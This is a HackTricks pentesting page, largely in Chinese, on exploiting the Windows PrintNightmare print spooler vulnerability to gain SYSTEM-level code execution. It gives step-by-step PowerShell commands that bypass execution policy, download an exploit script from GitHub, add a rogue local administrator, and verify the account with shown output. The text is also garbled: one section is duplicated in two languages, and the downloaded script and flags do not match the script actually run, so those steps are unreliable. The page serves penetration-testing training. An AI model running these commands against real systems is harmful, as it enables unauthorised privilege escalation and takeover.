# PrintNightmare

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

**此页面的内容来自**[**https://academy.hackthebox.com/module/67/section/627**](https://academy.hackthebox.com/module/67/section/627)****

`CVE-2021-1675/CVE-2021-34527 PrintNightmare`是一个存在于[RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22)中的漏洞，用于允许远程打印和驱动程序安装。\
此函数旨在赋予具有Windows特权`SeLoadDriverPrivilege`的用户在远程打印池中**添加驱动程序**的能力。通常，此权限仅保留给内置的管理员组和打印操作员，他们可能有合法的需要在终端用户的计算机上远程安装打印机驱动程序。

该漏洞允许**任何经过身份验证的用户**在没有上述特权的情况下向Windows系统添加打印驱动程序，从而使攻击者能够在受影响的任何系统上完全远程**以SYSTEM身份执行代码**。该漏洞**影响到了所有支持的Windows版本**，并且由于**打印池**默认在**域控制器**、Windows 7和10上运行，并且通常在Windows服务器上启用，因此这构成了一个巨大的攻击面，因此被称为“噩梦”。

微软最初发布了一个未修复该问题的补丁（早期的指导是禁用Spooler服务，但这对许多组织来说是不切实际的），但在2021年7月发布了第二个[补丁](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)，并提供了检查特定注册表设置是否设置为`0`或未定义的指导。&#x20;

一旦这个漏洞被公开，PoC漏洞利用工具很快就被发布出来。**[@cube0x0](https://twitter.com/cube0x0)**的[**这个版本**](https://github.com/cube0x0/CVE-2021-1675)可以用于使用修改版的Impacket远程或本地执行恶意DLL。该存储库还包含一个**C#实现**。\
这个[**PowerShell实现**](https://github.com/calebstewart/CVE-2021-1675)可以用于快速本地权限提升。默认情况下，此脚本会**添加一个新的本地管理员用户**，但如果添加本地管理员用户不在范围内，我们也可以提供自定义的DLL以获取反向shell或类似的功能。

### **检查Spooler服务**

我们可以使用以下命令快速检查Spooler服务是否正在运行。如果它没有运行，我们将收到“路径不存在”的错误。
```
PS C:\htb> ls \\localhost\pipe\spoolss


Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
spoolss
```
### **使用PrintNightmare PowerShell PoC添加本地管理员**

首先，开始绕过目标主机上的执行策略：[bypassing](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)。

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
```

Next, download the PrintNightmare exploit module from GitHub:

```powershell
Invoke-WebRequest -Uri "https://github.com/afwu/PrintNightmare/raw/main/PrintNightmare.ps1" -OutFile "PrintNightmare.ps1"
```

Then, execute the PrintNightmare exploit to add a new local administrator account:

```powershell
.\PrintNightmare.ps1 -AddAdminAccount -Username "hacker" -Password "P@ssw0rd123!"
```

Finally, verify that the new local administrator account has been successfully added:

```powershell
net localgroup administrators
```

### **使用PrintNightmare PowerShell PoC添加本地管理员**

首先，开始绕过目标主机上的执行策略：[bypassing](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)。

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
```

接下来，从GitHub下载PrintNightmare漏洞模块：

```powershell
Invoke-WebRequest -Uri "https://github.com/afwu/PrintNightmare/raw/main/PrintNightmare.ps1" -OutFile "PrintNightmare.ps1"
```

然后，执行PrintNightmare漏洞以添加新的本地管理员账户：

```powershell
.\PrintNightmare.ps1 -AddAdminAccount -Username "hacker" -Password "P@ssw0rd123!"
```

最后，验证新的本地管理员账户是否成功添加：

```powershell
net localgroup administrators
```
```
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```
现在我们可以导入PowerShell脚本并使用它来添加一个新的本地管理员用户。
```powershell
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

[+] created payload at C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_am
d64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
```
### **确认新的管理员用户**

如果一切按计划进行，我们将拥有一个新的受控本地管理员用户。添加用户是“有声音的”，我们不希望在需要保持隐蔽的任务中这样做。此外，我们还需要与客户确认账户创建是否在评估范围内。
```
PS C:\htb> net user hacker

User name                    hacker
Full Name                    hacker
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?8/?9/?2021 12:12:01 PM
Password expires             Never
Password changeable          ?8/?9/?2021 12:12:01 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者你想要**获取最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享你的黑客技巧**。

</details>
